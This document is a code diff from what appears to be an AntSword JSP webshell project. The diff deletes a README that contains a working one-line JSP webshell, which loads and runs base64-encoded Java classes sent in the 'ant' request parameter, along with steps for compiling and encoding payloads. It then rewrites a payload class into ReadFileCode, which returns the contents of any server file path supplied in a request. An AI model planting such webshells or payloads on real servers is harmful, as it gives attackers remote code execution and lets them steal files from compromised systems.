@@ -1,39 +1,9 @@
-# JspForAntSword
-中国蚁剑JSP一句话Payload
-
-详细介绍： https://yzddmr6.tk/posts/antsword-diy-3/
-
-环境： jdk1.6  tomcat7
-
-编译命令
-
-```
-javac -cp "D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar" Test.java
-```
-
-保存编译后的class字节码
-
-```
-base64 -w 0 Test.class > Test.txt
-```
-
-Shell：
-
-```
-<%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%><% String cls=request.getParameter("ant");if(cls!=null){ new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%>
-```
-
-
-
-Demo.java
-
-```
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.jsp.PageContext;
-import java.io.ByteArrayOutputStream;
+import java.io.*;
 
-public class Demo {
+public class ReadFileCode {
     public String encoder;
     public String cs;
     @Override
@@ -49,12 +19,9 @@ public class Demo {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
             response.setCharacterEncoding(cs);
-            String var0 = EC(decode(request.getParameter("var0")+""));
             String var1 = EC(decode(request.getParameter("var1")+""));
-            String var2 = EC(decode(request.getParameter("var2")+""));
-            String var3 = EC(decode(request.getParameter("var3")+""));
             output.append("->" + "|");
-            //sb.append(SysInfoCode(var0));
+            sb.append(ReadFileCode(var1));
             output.append(sb.toString());
             output.append("|" + "<-");
             page.getOut().print(output.toString());
@@ -89,8 +56,14 @@ public class Demo {
         }
         return str;
     }
+    String ReadFileCode(String filePath) throws Exception {
+        String l = "", s = "";
+        BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(filePath)), cs));
+        while ((l = br.readLine()) != null) {
+            s += l + "\r\n";
+        }
+        br.close();
+        return s;
+    }
 
 }
-
-```
-
